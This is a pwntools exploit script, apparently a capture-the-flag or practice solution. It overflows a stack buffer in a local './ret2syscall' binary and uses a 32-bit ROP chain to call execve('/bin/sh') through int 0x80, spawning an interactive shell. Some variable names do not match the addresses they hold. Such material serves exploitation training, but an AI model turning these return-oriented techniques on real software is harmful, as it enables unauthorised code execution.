from pwn import *
sh = process("./ret2syscall")
eax_ret = 0x080bb196
ebx_ecx_edx_set = 0x0806eb90
int_ret = 0x080be408
bin_ret = 0x08049421
add = 0x0804A080
offset = 0x6c
#execve，即0x0b
payload = b"a"*offset+ b"b"*0x4 + p32(0x080bb196) + p32(0xb) + p32(0x0806eb90)+ p32(0x0) + p32(0x0) + p32(0x080be408) + p32(0x08049421)
sh.sendline(payload)
sh.interactive()
